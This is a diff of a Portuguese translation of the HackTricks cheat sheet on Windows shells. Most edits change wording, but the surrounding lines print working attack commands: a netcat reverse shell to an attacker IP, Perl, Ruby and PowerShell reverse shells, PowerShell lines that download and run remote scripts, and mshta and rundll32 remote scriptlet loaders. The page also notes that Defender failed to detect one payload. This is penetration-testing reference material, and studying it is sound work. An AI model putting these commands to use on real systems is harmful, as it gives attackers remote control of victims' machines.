@@ -6,7 +6,7 @@
 
 Outras maneiras de apoiar o HackTricks:
 
-* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
@@ -16,7 +16,7 @@ Outras maneiras de apoiar o HackTricks:
 
 **Grupo de Segurança Try Hard**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -24,8 +24,8 @@ Outras maneiras de apoiar o HackTricks:
 
 ## Lolbas
 
-A página [lolbas-project.github.io](https://lolbas-project.github.io/) é para Windows, assim como [https://gtfobins.github.io/](https://gtfobins.github.io/) é para linux.\
-Obviamente, **não existem arquivos SUID ou privilégios sudo no Windows**, mas é útil saber **como** alguns **binários** podem ser (ab)usados para realizar algum tipo de ações inesperadas como **executar código arbitrário.**
+A página [lolbas-project.github.io](https://lolbas-project.github.io/) é para Windows assim como [https://gtfobins.github.io/](https://gtfobins.github.io/) é para linux.\
+Obviamente, **não existem arquivos SUID ou privilégios sudo no Windows**, mas é útil saber **como** alguns **binários** podem ser (mal)usados para realizar algum tipo de ações inesperadas como **executar código arbitrário.**
 
 ## NC
 ```bash
@@ -33,7 +33,7 @@ nc.exe -e cmd.exe <Attacker_IP> <PORT>
 ```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/) é uma alternativa portátil e segura ao Netcat**. Funciona em sistemas semelhantes ao Unix e Win32. Com recursos como criptografia forte, execução de programas, portas de origem personalizáveis e reconexão contínua, o sbd oferece uma solução versátil para comunicação TCP/IP. Para usuários do Windows, a versão sbd.exe da distribuição Kali Linux pode ser usada como um substituto confiável para o Netcat.
+**[sbd](https://www.kali.org/tools/sbd/) é uma alternativa portátil e segura ao Netcat**. Funciona em sistemas semelhantes ao Unix e Win32. Com recursos como criptografia forte, execução de programas, portas de origem personalizáveis e reconexão contínua, o sbd oferece uma solução versátil para comunicação TCP/IP. Para usuários do Windows, a versão sbd.exe da distribuição Kali Linux pode ser usada como uma substituição confiável para o Netcat.
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -52,14 +52,12 @@ C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('1
 ```
 ## Perl
 
-Perl is a high-level, general-purpose, interpreted programming language known for its flexibility and powerful text processing capabilities. It is commonly used for system administration, web development, and network programming. Perl scripts can be used for various tasks, including automating repetitive tasks, parsing and processing text files, and creating network tools. Perl is supported on Windows operating systems and can be used to create powerful shell scripts for Windows environments.
+Perl is a high-level, general-purpose programming language that is commonly used for scripting and system administration tasks. It is known for its powerful text processing capabilities and is often used for creating shell scripts on Windows systems. Perl scripts can be executed on Windows using the Perl interpreter, which needs to be installed on the system.
 ```bash
 perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 ## Ruby
-
-Ruby is a dynamic, open source programming language with a focus on simplicity and productivity. It has an elegant syntax that is easy to read and write. Ruby is commonly used for web development and is known for its Rails framework, which makes building web applications faster and easier.
 ```bash
 #Windows
 ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
@@ -98,6 +96,8 @@ powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
 Processo realizando chamada de rede: **svchost.exe**\
 Carga gravada no disco: **cache local do cliente WebDAV**
+
+**Em uma linha:**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
@@ -142,7 +142,7 @@ new ActiveXObject('WScript.Shell').Run(c);
 ```
 #### **mshta - sct**
 
-[**A partir daqui**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
+[**Daqui**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
 ```xml
 <?XML version="1.0"?>
 <!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
@@ -176,7 +176,7 @@ Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given
 
 ## **Rundll32**
 
-[**Exemplo de Dll olá mundo**](https://github.com/carterjones/hello-world-dll)
+[**Exemplo de Dll hello world**](https://github.com/carterjones/hello-world-dll)
 
 * [Daqui](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ```bash
@@ -395,7 +395,7 @@ Comece a servir o script em um servidor web e execute-o no final da vítima:
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
-Defender não o detecta como código malicioso (ainda, 3/04/2019).
+Defender ainda não o detecta como código malicioso (até 3/04/2019).
 
 **TODO: Verificar outros shells do nishang**
 
@@ -411,7 +411,7 @@ Defender ainda não o detecta como código malicioso (ainda, 3/04/2019).
 
 **Outras opções oferecidas pelo powercat:**
 
-Bind shells, Reverse shell (TCP, UDP, DNS), Redirecionamento de porta, upload/download, Gerar payloads, Servir arquivos...
+Conexão de shells, Shell reverso (TCP, UDP, DNS), Redirecionamento de porta, upload/download, Gerar payloads, Servir arquivos...
 ```
 Serve a cmd Shell:
 powercat -l -p 443 -e cmd
@@ -436,7 +436,7 @@ Crie um iniciador powershell, salve-o em um arquivo e faça o download e execute
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-**Código detectado como malicioso**
+**Detectado como código malicioso**
 
 ### MSF-Unicorn
 
@@ -454,7 +454,7 @@ Inicie um servidor web servindo o arquivo _powershell\_attack.txt_ e execute no 
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
-**Código detectado como malicioso**
+**Detectado como código malicioso**
 
 ## Mais
 
@@ -474,7 +474,7 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) Console PS com alguns módulos
 ​
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -486,7 +486,7 @@ Outras formas de apoiar o HackTricks:
 
 * Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou nos siga no **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
 * **Compartilhe seus truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
